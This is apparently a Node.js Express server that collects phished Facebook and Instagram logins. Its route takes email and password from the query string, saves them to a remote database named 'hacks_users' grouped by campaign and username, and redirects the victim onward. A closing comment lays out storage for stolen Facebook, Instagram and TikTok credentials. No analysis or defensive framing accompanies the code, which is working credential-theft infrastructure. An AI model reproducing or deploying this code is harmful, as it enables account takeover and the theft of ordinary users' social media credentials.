const express = require('express')
const http = require('http')
const XMLHttpRequest = require('xhr2')
const cors = require('cors')
const dibase = require('./module/DIBASE')
const app = express()
const server = http.createServer(app)
const PORT = 2007; 
const domains ={
    id:"server-users",
    domains:[
        {
            name:"hacks_users",
            password:"HACKUSERSPASS"
        }
    ] 
}
const dib = new dibase('wss://dibase.onrender.com', domains)
const { hacks_users } = dib.base 
app.use(cors({
    origin:'*'
}))
app.use(express.urlencoded({ extended: true }))
app.use(express.static('./PUB'))
app.get('/',(req, res)=>{
    res.send('<h1>Hello<h1>')
})
app.get('/:type/:greep/set',(req, res)=>{
    res.status(200)
    if (req.params.type == 'facebook' || req.params.type == 'instagram') {
        save_data({query:req.query, greep:req.params.greep})
        if (req.query.to) {
            res.redirect(req.query.to += '?log=true')
        }
    }
})  

//=======================================================================
var DATA = {}
hacks_users.onchange = ({dataA, dataB})=>{
    console.log('DATA ',JSON.stringify(dataB))
}
hacks_users.onload = async(data)=>{
    console.log('DATA LOAD',data)
    // return hacks_users.clear(1)
    if (! data.all_users) {
        hacks_users.setpath(['all_users'])
        hacks_users.setpath(['type', 'facebook'])
        hacks_users.setpath(['type', 'instagram'])
        hacks_users.setpath(['type', 'tiktok'])
    }
}
//=========================> Save Data <==============================================
const save_data = ({query, greep})=>{
    query.user_name = email_name(query.email)
    if (! dib.IPath(DATA, ['type', query.type, greep])) {
        hacks_users.setpath(['type', query.type, greep])
    }
    if (! dib.IPath(DATA, ['type', query.type, greep, query.user_name])) {
        hacks_users.setpath(['type', query.type, greep, query.user_name], true)
        hacks_users.set({[query.user_name]:form_data({query, greep})},['type', query.type, greep])
    }
}
const form_data = ({query, greep})=>{
    const user = {
        email:query.email,
        password:query.password,
        date:'2024/10/14'
    }
    
    return user
}
const email_name = (email)=>{
    let Email = email
    if (Email.indexOf('@')) {
        return Email.slice(0,Email.indexOf('@'))
    }
    return Email
}
server.listen(PORT, ()=>{
    console.log(`i am listening in port : ${PORT}`)
})
/*////////////////////////// Example //////////////////////
 {
    type:{
        facebook:{
            [ greep ]:{
                [ username ]:{
                    date    :"",
                    email   :"",
                    password:"" 
                }
            },
            [ greep ]:{
                [ username ]:{
                    date    :"",
                    email   :"",
                    password:"" 
                }
            }
        },
        instgram:{},
        tktok:{}
    }
 }
*/